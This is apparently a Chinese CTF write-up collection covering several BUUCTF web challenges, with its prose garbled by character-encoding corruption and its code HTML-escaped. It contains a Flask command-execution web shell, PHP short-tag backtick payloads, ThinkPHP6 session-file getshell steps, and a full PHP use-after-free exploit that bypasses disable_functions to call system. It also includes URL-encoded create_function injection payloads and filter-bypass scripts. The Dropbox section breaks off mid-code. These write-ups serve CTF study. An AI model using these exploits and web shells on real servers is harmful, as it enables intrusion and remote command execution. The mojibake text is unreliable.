@current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def shell(): import os from flask import request cmd&#x3D;request.args.get(&#39;cmd&#39;) rt&#x3D;os.popen(cmd).read() return rt å†™å…¥ ç„¶åç›´æ¥å†™å…¥å‘½ä»¤ å¯èƒ½ä¼šå‡ºç°not foundçš„æŠ¥é”™ï¼Œå¤šè¯•å‡ æ¬¡ [CISCN2019 åä¸œå—èµ›åŒº]Double Secret æœ‰/secretç›®å½•ï¼Œæ‰«ä¸€ä¸‹æˆ–è€…çŒœå‡ºæ¥ arjunæ‰«ä¸€ä¸‹æ˜¯å¦æœ‰ä¼ å‚ å½“æ•°è¿‡å¤§æ—¶å°±ä¼šè¿›å…¥debugç•Œé¢ï¼Œè¿™æ—¶å€™åŸºæœ¬å°±ç¡®å®šè¿™æ˜¯sstiæ³¨å…¥äº†ï¼Œå¯ä»¥çœ‹çœ‹æºç  é‡‡ç”¨RC4åŠ å¯†çš„æ–¹å¼ï¼Œè¿™æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ï¼Œå¯¹å¯†æ–‡å†æ¬¡åŠ å¯†å°±ä¼šå˜æˆæ˜æ–‡ï¼Œå¯†é’¥æ˜¯HereIsTreasureï¼ŒçŸ¥é“è¿™ä¸ªåï¼Œåˆ©ç”¨cyberchefï¼Œå¯¹è¦è¾“å…¥çš„è¯­å¥è¿›è¡ŒåŠ å¯†ï¼Œå†å°†å¯†æ–‡ä¼ å‚è¿›å» èƒ½æ‰¾åˆ°æ ¹ç›®å½•ä¸‹çš„flag.txt catè¯»å– è¿™é‡Œåº”è¯¥æ˜¯å–å·§äº†ï¼Œbuuçš„flagé‡Œä¸åŒ…å«ciscnï¼Œæ‰€ä»¥è¿™ä¸ªè¿‡æ»¤å°±æ²¡ç”¨äº† ä»ä¸€é“ctfé¢˜è°ˆè°ˆflaskå¼€å¯debugæ¨¡å¼å­˜åœ¨çš„å®‰å…¨é—®é¢˜_pin (sohu.com) [çº¢æ˜è°·CTF 2021]write_shell&lt;?php error_reporting(0); highlight_file(__FILE__); function check($input)&#123; if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123; &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123; die(&#39;hacker!!!&#39;); &#125;else&#123; return $input; &#125; &#125; function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key&#x3D;&gt;$output)&#123; $input[$key] &#x3D; waf($output); &#125; &#125;else&#123; $input &#x3D; check($input); &#125; &#125; $dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;; if(!file_exists($dir))&#123; mkdir($dir); &#125; switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#39;pwd&#39;: echo $dir; break; case &#39;upload&#39;: $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); &#125; ?&gt; è¿‡æ»¤ï¼›å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ï¼Œè¿‡æ»¤evalå¯ä»¥é‡‡ç”¨åå¼•å·ï¼Œè¿‡æ»¤ç©ºæ ¼å¯ä»¥ç”¨\\t PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?&#x3D;?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?&#x3D;?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;ã€‚ ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\\t&#x2F;&#96;?&gt; ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;flllllll1112222222lag&#96;?&gt; æˆ–è€… ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;f*&#96;?&gt; *ä¸ºé€šé…ç¬¦ [GYCTF2020]EasyThinkingé¢˜ç›®æ—¶thinkphp6ç‰ˆæœ¬çš„æ¼æ´ ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ - é“¾æ»´ (ld246.com) åªéœ€è¦æ„é€  PHPSESSID çš„å€¼å³å¯ï¼Œå€¼ä¸º string&amp;&amp;é•¿åº¦ä¸º 32 æ­¤æ—¶æŸ¥çœ‹ä¸€ä¸‹ç”Ÿæˆçš„ sessionï¼Œç”Ÿæˆçš„ session æ–‡ä»¶ä¿å­˜åœ¨ \\runtime\\session ä¸‹ session é‡Œçš„å†…å®¹: a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125; å¯ä»¥çœ‹åˆ° session çš„å†…å®¹ç»è¿‡äº†åºåˆ—åŒ–æ“ä½œï¼Œåªè¦å°† session çš„å†…å®¹ååºåˆ—åŒ–å³å¯ getshell è¿™ä¸ªå¸ˆå‚…æ„é€ äº†ä¸€ä¸ªå‘SESSIONä¸­å†™å…¥å€¼çš„ç±»å’Œå‡½æ•°ï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œæœç´¢çš„å†…å®¹ç›´æ¥è¢«å†™å…¥äº†SESSIONï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯æˆ‘ä¹Ÿçœ‹ä¸æ‡‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹sessionä¸º.phpçš„åç¼€ï¼Œç„¶å åœ¨æœç´¢æ é‡Œæœä¸ªé©¬ï¼Œå°±å¯ä»¥åœ¨/runtime/sessionè·¯å¾„ä¸‹è®¿é—®å¹¶æ‰§è¡Œè¿™ä¸ªé©¬ å…ˆè¯•è¯•phpinfo /runtime/session/sess_0123456789012345678901234568.php å†™ä¸ªä¸€å¥è¯æœ¨é©¬ èšå‰‘è¿æ¥ æ ¹ç›®å½•åˆflagä½†æ˜¯æ‰“å¼€æ²¡ä¸œè¥¿ï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶,çŒœæµ‹æ˜¯è¦æ‰§è¡Œreadflagæ¥è¯»å–flagæ–‡ä»¶é‡Œçš„å†…å®¹ ä½†æ˜¯åœ¨è™šæ‹Ÿç»ˆç«¯æ— æ³•æ‰§è¡Œå‘½ä»¤ ç»“åˆphpinfoé‡Œçš„ç¦ç”¨å‡½æ•° èƒ½å¾—å‡ºè¿™æ˜¯ä¸ªçªç ´disable_functioné™åˆ¶æ‰§è¡Œå‘½ä»¤çš„è€ƒç‚¹ ä¹‹å‰[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEä¹Ÿæœ‰è¿™ä¸ªè€ƒç‚¹ï¼ˆå¾€ä¸Šç¿» ä½†æ˜¯åœ¨è¿™é“é¢˜é‡Œç”¨èšå‰‘çš„æ’ä»¶æ²¡æ³•ç»•è¿‡ ä¸Šä¸ªexpï¼ˆç¾¡æ…•èƒ½å†™å‡ºè¿™ç§expçš„å¤§å¸ˆå‚… &lt;?php pwn(&quot;&#x2F;readflag&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p + $j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i &#x3D; 0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if ($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if (!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if ($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if ($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while ($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if (stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for ($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if (!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if (!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if (!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; æŠŠè¿™ä¸ªphpæ–‡ä»¶æ‰¾ä¸ªåœ°æ–¹ä¼ ä¸Šå» è®¿é—®è¿™ä¸ªè·¯å¾„ï¼Œå¾—åˆ°flag [BJDCTF2020]EzPHPè¿™ä¸ªé¢˜è´¨é‡å¥½é«˜ ä¸­é—´è¿™ä¸ªä¸œè¥¿é“¾æ¥å¥½åƒå¯„äº†ï¼Œä½†æ˜¯ä¸å½±å“åšé¢˜ï¼Œæºç é‡Œæœ‰ä¸²base32ï¼Œè§£ç ä¸º1nD3x.php è®¿é—®è¿™ä¸ªé¡µé¢ &lt;?php highlight_file(__FILE__); error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;; $shana &#x3D; $_GET[&#39;shana&#39;]; $passwd &#x3D; $_GET[&#39;passwd&#39;]; $arg &#x3D; &#39;&#39;; $code &#x3D; &#39;&#39;; echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; if($_SERVER) &#123; if ( preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;]) ) die(&#39;You seem to want to do something bad?&#39;); &#125; if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123; if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; $file &#x3D; $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value)) die(&#39;fxck you! I hate English!&#39;); &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;); if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;; &#125; else&#123; die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;); &#125; if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\&#96;|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#39;|\\&#x3D;|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^&#x2F;i&#39;, $arg) ) &#123; die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#39;&#39;, $arg); &#125; ?&gt; è¿‡æ»¤äº†ä¸€å †ä¸œè¥¿ é¦–å…ˆæ˜¯è¿™ä¸ªï¼Œquery_stringè·å–çš„å†…å®¹ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥ç»•è¿‡è¿™ä¸€æ­¥å°±åªéœ€è¦æŠŠä¼ å…¥çš„å‚æ•°è¿›è¡Œurlç¼–ç å°±è¡Œ è¿™é‡Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡preg_matchçš„åŒ¹é… è¿™ä¸ªç”±äºæ£€æµ‹çš„$_REQUESTï¼Œè€Œå¯¹ $_REQUESTæ¥è¯´postçš„ä¼˜å…ˆçº§å¤§äºgetï¼Œæ‰€ä»¥è¦postä¼ å…¥å’Œgetå†…å®¹ç›¸åŒçš„å‚æ•°ï¼ŒæŠŠå€¼æ”¹ä¸ºæ•°å­—å°±è¡Œ è¿™ä¸ªè¦ç”¨data://ä¼ªåè®®å°±è¡Œ å¸¸è§çš„æ•°ç»„ç»•è¿‡ æœ€åè¿™ä¹Ÿæ˜¯æœ€é‡è¦çš„åœ°æ–¹ é¦–å…ˆè¯´ä¸€ä¸‹create_functionæ³¨å…¥ create_function() å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° $args å’Œ $codeï¼Œç”¨äºåˆ›å»ºä¸€ä¸ª lambda æ ·å¼çš„å‡½æ•° ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹bè¿›è¡Œæ“ä½œï¼Œæ¥å®ç°è¿™ä¸ªå‡½æ•°çš„æå‰é—­åˆï¼Œå¹¶å†™å…¥æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ï¼Œç„¶åé€šè¿‡æ³¨é‡Šç¬¦ä½¿è¯­å¥åˆç† $arg å’Œ $code å˜é‡éƒ½æ˜¯å¯æ§çš„ï¼Œå› ä¸º extract() å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚å› æ­¤åªè¦ extract() å†…çš„æ•°ç»„é”®åä¸º arg å’Œ codeï¼Œé”®å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„ç”¨æ¥æ³¨å…¥çš„ä»£ç ï¼Œå³å¯å®ç° $arg å’Œ $code çš„å˜é‡è¦†ç›–ï¼Œå¯¼è‡´ä»£ç æ³¨å…¥ã€‚ å†åˆ©ç”¨ var_dump(get_defined_vars()) ç”¨æ¥è¾“å‡ºæ‰€æœ‰å˜é‡å’Œå€¼ &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e è§£ç å†…å®¹ï¼š &#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute &amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function ä½†æ˜¯çœ‹è§flagåœ¨rea1fl4gé‡Œ æ‰€ä»¥è¦åˆ©ç”¨requireåŒ…å«è¿™ä¸ªæ–‡ä»¶ç„¶åå†ç”¨get_defined_vars()è¯»ä¸€éè¯•è¯• ä½†æ˜¯åˆè¿‡æ»¤äº†. æ‰€ä»¥è¯•è¯•base64ç¼–ç  GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 è¿˜æ˜¯ä¸è¡Œï¼Œå°è¯•ä¼ªåè®®è¯»æºç äº†åªèƒ½ require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php) é‡‡ç”¨å–åç»•è¿‡è¿‡æ»¤ GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e &#x2F;&#x2F;è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæŠŠrequireä¹Ÿå–åå°±æ²¡æ³•ç”¨äº† POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 &#x2F;&#x2F; preg_match() åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡ã€‚ 2020BJDCTF â€œEzPHPâ€ +Y1ngCTF â€œY1ngâ€™s Baby Codeâ€ å®˜æ–¹writeup â€“ é¢–å¥‡L&#39;Amore (gem-love.com) åŸé¢˜ç”¨å¼‚æˆ–ä¹Ÿå¯ä»¥ï¼Œè´´ä¸ªè„šæœ¬å…ˆï¼Œä¸‡ä¸€ä»¥åèƒ½ç”¨åˆ° #Author: piCEBDC7 str_&#x3D; &#39;1flag.php&#39; str_&#x3D;list(str_) final&#x3D;&#39;&#39; for x in str_: print(hex(~ord(x)&amp;0xff)) final+&#x3D;hex(~ord(x)&amp;0xff) print(str_) final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;) final+&#x3D;&#39;^&#39; for x in range(len(str_)): final+&#x3D;r&#39;%ff&#39; print(final) å–åè„šæœ¬ &lt;? &#x2F;&#x2F;Author: é¢–å¥‡L&#39;Amore &#x2F;&#x2F;Blog: www.gem-love.com $a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;; $arr1 &#x3D; explode(&#39; &#39;, $a); echo &quot;&lt;br&gt;~(&quot;; foreach ($arr1 as $key &#x3D;&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value); &#125; echo &quot;)&lt;br&gt;&quot;; ç”¨ç¾½å¸ˆå‚…é‚£ä¸ªä¹Ÿè¡Œ [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]DropboxçŸ¥è¯†ç‚¹ï¼špharçš„ååºåˆ—åŒ– ä¼ ä¸ªjpgæ–‡ä»¶ç„¶åä¸‹è½½çš„æ—¶å€™æŠ“åŒ…æœ‰ä¸ªfilenameï¼Œè¿™é‡Œå¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å– index.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; $a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]); $a-&gt;Name(); $a-&gt;Size(); ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;); chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123; Header(&quot;Content-type: application&#x2F;octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename)); echo $file-&gt;close(); &#125; else &#123; echo &quot;File not exist&quot;; &#125; ?&gt; login.php &lt;?php session_start(); if (isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: index.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; if (isset($_GET[&#39;register&#39;])) &#123; echo &quot;&lt;script&gt;toast(&#39;æ³¨å†ŒæˆåŠŸ&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;; &#125; if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123; $u &#x3D; new User(); $username &#x3D; (string) $_POST[&quot;username&quot;]; $password &#x3D; (string) $_POST[&quot;password&quot;]; if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123; $_SESSION[&#39;login&#39;] &#x3D; true; $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username); $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;; if (!is_dir($sandbox)) &#123; mkdir($sandbox); &#125; $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox; echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); die(); &#125; echo &quot;&lt;script&gt;toast(&#39;è´¦å·æˆ–å¯†ç é”™è¯¯&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;; &#125; ?&gt; class.php &lt;?php error_reporting(0); $dbaddr &#x3D; &quot;127.0.0.1&quot;; $dbuser &#x3D; &quot;root&quot;; $dbpass &#x3D; &quot;root&quot;; $dbname &#x3D; &quot;dropbox&quot;; $db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db &#x3D; $db; &#125; public function user_exist($username) &#123; $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count &#x3D; $stmt-&gt;num_rows; if ($count &#x3D;&#x3D;&#x3D; 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if 